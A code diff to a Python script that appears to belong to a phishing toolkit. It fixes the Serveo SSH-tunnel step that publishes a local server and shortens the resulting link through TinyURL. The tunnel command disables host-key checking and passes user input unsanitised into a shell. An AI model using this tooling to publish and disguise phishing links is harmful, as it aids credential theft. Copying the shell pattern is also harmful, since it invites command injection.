@@ -6,7 +6,7 @@ from time import sleep
 import re
 import json
 from urllib.request import urlopen
-from subprocess import check_output
+from subprocess import check_output, CalledProcessError
 from sys import stdout, argv
 from Defs.Configurations import readConfig, ifSettingsNotExists
 from Defs.Languages import *
@@ -104,11 +104,15 @@ def runNgrok():
 def runServeo():
     print(_("\n {0}Insert a custom subdomain for serveo").format(RED, DEFAULT))
     lnk = input(_("\n {0}CUSTOM Subdomain>>> {1}").format(RED, DEFAULT))
+    if not ".serveo.net" in lnk:
+        lnk += ".serveo.net"
+    else:
+        pass
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R %s:80:localhost:1111 serveo.net > link.url 2> /dev/null &' % (lnk))
     sleep(7)
     try:
-        output = check_output("grep -o 'https://[_0-9a-z]*\.serveo.net' link.url",shell=True)
-        url = str(output).strip("b ' \ n")
+        output = check_output("grep -o '.\{0,0\}http.\{0,50\}' link.url",shell=True)
+        url = str(output).strip("b ' \ n r")
         print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
         print("\n")
         data = urlopen("http://tinyurl.com/api-create.php?url="+url)
@@ -116,7 +120,7 @@ def runServeo():
         link = url.decode('utf-8')
         print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(RED, DEFAULT, GREEN) + link + "{1}".format(RED, DEFAULT, GREEN))
         print("\n")
-    except subprocess.CalledProcessError:
+    except CalledProcessError:
         print ('''
   ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _
       /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
